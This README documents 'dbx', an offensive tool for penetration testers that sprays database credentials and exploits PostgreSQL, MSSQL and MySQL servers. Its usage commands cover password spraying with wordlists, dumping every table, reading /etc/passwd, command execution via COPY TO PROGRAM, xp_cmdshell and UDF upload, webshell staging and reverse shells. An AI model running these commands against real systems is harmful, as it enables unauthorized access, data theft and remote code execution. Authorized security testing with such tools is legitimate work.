[![Made with Rust](https://img.shields.io/badge/Made%20with-Rust-orange?logo=rust)](https://www.rust-lang.org) [![License: BSD 2-Clause](https://img.shields.io/badge/License-BSD_2--Clause-orange.svg)](LICENSE) 
[![Protocols](https://img.shields.io/badge/protocols-postgres%20%C2%B7%20mssql%20%C2%B7%20mysql-blue)](#)
[![Platform](https://img.shields.io/badge/platform-linux%20%C2%B7%20musl%20static-lightgrey)](#)
# dbx
The database execution tool, credential spraying, enumeration, and verified post-exploitation for database engines. Think nxc, but for databases.

# dbx

```
     _ _
  __| | |____  __
 / _` | '_ \ \/ /
| (_| | |_) |>  <
 \__,_|_.__//_/\_\



Usage: dbx [OPTIONS] <COMMAND>

The database execution tool, credential spraying, enumeration and verified post-exploitation for database engines.

Commands:
  pg     Own stuff using PostgreSQL [alias: postgres]
  mssql  Own stuff using MSSQL
  mysql  Own stuff using Mysql
  loot   Review captured loot
  help   Print this message or the help of the given subcommand(s)

Options:
  -h, --help     Print help
  -V, --version  Print version

Generic Options:
  -t, --threads <THREADS>  Concurrent authentications [default: 100]
      --timeout <TIMEOUT>  Timeout in seconds per authentication [default: 10]
      --jitter <MIN-MAX>   Random delay between auths per target, in ms (e.g. 200-1500)

Output Options:
      --only-success    Hide [-] failures; show fingerprints, hits and the tally
      --only-pwned      Print only privileged (Pwn3d!) hits
  -q, --quiet           Successes only, nothing else, pure grep output
  -v, --verbose         Verbose: error codes, retries, backoff notices
      --no-progress     Do not display the progress bar during sprays
      --log <FILE>      Export results to a log file
      --loot-db <PATH>  Loot database location [default: ~/.dbx/loot.db]


Built by 0xS0B
Codename: First Contact
Protocols under active development: redis
```

---

## Why dbx exists

On an internal engagement with ~2,000 assets, there was no good way to spray and validate database credentials at scale against native protocols, every tool was either HTTP-focused, SQLi-focused, or a one-off script, it was frustrating actually, I had creds just didn't know where they'd work, dbx was the answer, one binary, native wire protocols, nxc's muscle memory because it's what I'm used to.
I hope it'd bring the help it provided me.

I only used postgres and mysql in the engagement, but then I saw the potential for it so I decided to polish it and add other protocols, in the coming weeks/months, I'd be polishing this, adding more protocols and features.

## Design principles

- **nxc-identical UX**: `dbx <proto> <targets> -u user -p pass`. `[+]` for hits, `(Pwn3d!)` for admins, `[-]` dimmed failures, `[*]` info, `[M]` module output, progress bar included.
- **Verify-then-execute**: every module has a `check()` that proves the primitive is possible *without mutating state*, then a `run()` that uses it. "Check says yes but run says no" is treated as a bug and turned into a new check condition.
- **Opsec tiers**: `GREEN` (read-only), `AMBER` (executes / temp state, restored), `RED` (persistent artifacts: blocked unless `--force`).
- **Droppable binaries**: rustls everywhere, OpenSSL banned, sqlite bundled. Build a static musl binary, drop it on a pivot box, done.
- **Loot**: every hit is written to the sqlite store *before* it's printed. If the terminal dies, the loot survives.

## Workspace layout

```
crates/
  dbx          CLI: arg parsing, input expansion, engine, output, loot store
  dbx-core     Traits & types: Protocol, Session, Module, AuthError, Opsec
  dbx-pg       PostgreSQL driver + modules (tokio-postgres, NoTls)
  dbx-mssql    MSSQL driver + modules (tiberius, rustls)
  dbx-mysql    MySQL / MariaDB driver + modules (mysql_async, pure-Rust backend)
  dbx-ntlm     Pure-Rust NTLMv2 implementation (6/6 known-answer tests green)
```

## Usage

```bash
dbx <protocol> <targets> -u <user|file> -p <pass|file> [options]

Protocols: pg (alias: postgres) · mssql · mysql (alias: mariadb)
```

### Targets

```bash
dbx mysql 10.0.0.5 -u root -p hunter2          # single host, default port
dbx mysql 10.0.0.5:3307 -u root -p hunter2     # non-default port
dbx mysql 10.0.0.0/24 -u root -p hunter2       # CIDR
dbx mysql 10.0.0.0/24:3307 -u root -p hunter2  # CIDR with override port
dbx mysql 10.0.0.10-50 -u root -p hunter2      # range
dbx mysql targets.txt -u root -p hunter2       # file of targets (host or host:port per line)
```

### Credentials

File-vs-literal is nxc semantics: if the value is an existing file, it's read as a list (UTF-8/Latin-1); otherwise it's a literal. Users × passwords are cross-producted.

```bash
dbx pg 10.0.0.0/24 -u postgres -p rockyou.txt --only-success
```

### Output control

| Flag | Effect |
|---|---|
| `--only-success` | Hide `[-]` failures; show hits, info, tally |
| `--only-pwned` | Print only admin `(Pwn3d!)` hits |
| `-q, --quiet` | Successes only, pure grep output |
| `-v, --verbose` | Debug logging (unmutes driver internals) |
| `--no-progress` | No progress bar |
| `-t, --threads N` | Concurrent auths (default 100) |

### Recon

```bash
dbx mysql 10.0.0.5 -u root -p hunter2 --dbs                  # list databases
dbx mysql 10.0.0.5 -u root -p hunter2 --tables               # tables of EVERY database
dbx mysql 10.0.0.5 -u root -p hunter2 --db app --tables      # tables of one database
dbx mssql 10.0.0.5 -u sa -p 'Passw0rd!' --tables --skip-system   # hide master/msdb/...
```

- `--dbs` / `--tables` / `--thief-all` all honor `--skip-system` (MySQL: `information_schema`, `mysql`, `performance_schema`, `sys` · MSSQL: `master`, `model`, `msdb`, `tempdb` · PG: `template*`)
- Empty databases print a dimmed `db: no user tables`
- PG tables print schema-qualified (`public.users`) and `--thief` takes the same form

### Loot

```bash
dbx loot creds                    # every captured credential
dbx loot creds --protocol mysql   # filtered
```

Store: `~/.dbx/loot.db` (sqlite), tables: `credentials`, `databases`, `verified_primitives`, `module_runs`. Override with `--loot-db`.

### Data theft

```bash
dbx pg 10.0.0.5 -u postgres -p hunter2 --db lab --thief public.users
dbx mysql 10.0.0.5 -u root -p hunter2 --db app --thief users,creds --thief-limit 5000
dbx mssql 10.0.0.5 -u sa -p 'Passw0rd!' --thief-all          # every table of every db
```

CSVs land in `~/.dbx/thief/<PROTO>_<host>_<port>/<db>/<table>.csv`. `--thief-limit 0` = unlimited (default 10000).

### Modules

```bash
dbx pg -L                                     # list PGSQL modules with explanations
dbx pg 10.0.0.5 -u postgres -p x -M copy-rce --check          # verify only
dbx pg 10.0.0.5 -u postgres -p x -M copy-rce --cmd 'id'       # run with options
dbx pg 10.0.0.5 -u postgres -p x -M file-read --path /etc/passwd
```

Module options: `-o KEY=VALUE`, or nxc-style custom flags, any unknown `--flag value` becomes `FLAG=value` (`--atk-ip 10.0.0.9` → `ATK_IP=10.0.0.9`); a bare `--flag` becomes `FLAG=true`.

## Module catalog

### PostgreSQL

| Module | Opsec | What it does |
|---|---|---|
| `enum-roles` | GREEN | All roles with privilege flags (superuser, createrole, createdb, login, replication) |
| `enum-privs` | GREEN | Current user's privileges/role memberships; flags RCE-relevant server roles |
| `copy-rce` | AMBER | RCE via `COPY TO PROGRAM`. `--cmd` runs a command with output capture; `--atk-ip/--atk-port` fires a reverse shell |
| `file-read` | GREEN | `pg_read_file`, read server files |
| `file-write` | RED | `COPY TO FILE`, webshell/key staging |

### MSSQL

| Module | Opsec | What it does |
|---|---|---|
| `xp-cmdshell` | AMBER | Command execution with output. Handles `show advanced options` + reconfigure, restores state after; `--xp-reconfig on` leaves it enabled persistently. Detects SQL Server on Linux (15392) in `check()` |
| `enum-logins` | GREEN | Logins with sysadmin membership flags |
| `enum-linked` | GREEN | Linked servers, flags rpc-out enabled ones |

### MySQL / MariaDB

| Module | Opsec | What it does |
|---|---|---|
| `enum-users` | GREEN | `mysql.user`, accounts, auth plugin, password hashes (caching_sha2 → hashcat 7401) |
| `enum-privs` | GREEN | `SHOW GRANTS`, dangerous privileges flagged |
| `enum-vars` | GREEN | Attack-relevant variables (`plugin_dir`, `secure_file_priv`, log settings…) |
| `file-read` | GREEN | `LOAD_FILE()` with `secure_file_priv` awareness |
| `file-write` | RED | `INTO DUMPFILE`, refuses to overwrite, prefix-aware |
| `udf-rce` | RED | Uploads `lib_mysqludf_sys.so` to `plugin_dir`, `CREATE FUNCTION`, then `--cmd` executes with stdout capture (`sys_eval`). Idempotent, once deployed, `--cmd` alone works |
| `log-rce` | RED | `general_log` poisoning into a web path, original settings restored |

## Currently supported auth

| Protocol | Auth |
|---|---|
| PGSQL | cleartext / MD5 / SCRAM-SHA-256 (whatever the server asks, via tokio-postgres) |
| MSSQL | SQL logins (local auth) |
| MYSQL | `mysql_native_password`, `caching_sha2_password` (MySQL 8 default, RSA key exchange, no TLS needed) |

## Roadmap: what's not built yet

### In flight: Windows auth for MSSQL (Stage 2)

`dbx-ntlm` is done and test-green (NT hash, NTOWFv2, NTLMv2 responses, MIC, with pass-the-hash producing byte-identical messages to password auth). Remaining:

- [ ] Patch/vendor tiberius: `AuthMethod::ntlm`, LOGIN7 `fIntSecurity` bit, Type 1 in the SSPI field, Type 3 in a `0x11` packet sent **unencrypted** (the asymmetric-TLS landmine)
- [ ] CLI: `-d/--domain`, `DOMAIN\user` auto-detection, `-H/--hashes :NTHASH` (pass-the-hash), `--local-auth` to force SQL auth
- [ ] Extend `dbx_core::Credential` with `domain` / `nt_hash`

### Planned

- [ ] **Redis driver** (listed in the help footer as under development)
- [ ] **Safety rails**: `--jitter` and lockout-aware backoff (flags parse today, engine ignores them), `--no-bruteforce` (pair users:passwords 1:1), `--resume`
- [ ] **`--verify` pass**: call each protocol's `fingerprint()` before spraying, protocol-confirm mystery ports on big asset lists (the trait method exists; the engine doesn't call it yet)
- [ ] `--log FILE` output, JSON output mode
- [ ] Kerberos (`-k`) after NTLM lands
- [ ] MSSQL: pre-login version fingerprint, `enum-impersonate`, linked-server exec chains
- [ ] MySQL: TLS connections (currently plaintext + RSA exchange only)

## Known limitations

- **MariaDB `ed25519` auth** is unsupported by the mysql_async driver, surfaces as a protocol error
- **`xp_cmdshell` on SQL Server for Linux** doesn't exist (error 15392), `check()` gates on `sys.dm_os_host_info`, so you get an honest "not possible"
- **MySQL BLOBs** decode lossy in thief CSVs (fine for triage, not for binary loot)
- **`--db` typo on MySQL** (1049 unknown database) fails the auth line, not just the session, by design, but it means `--db` sprays want a database that exists

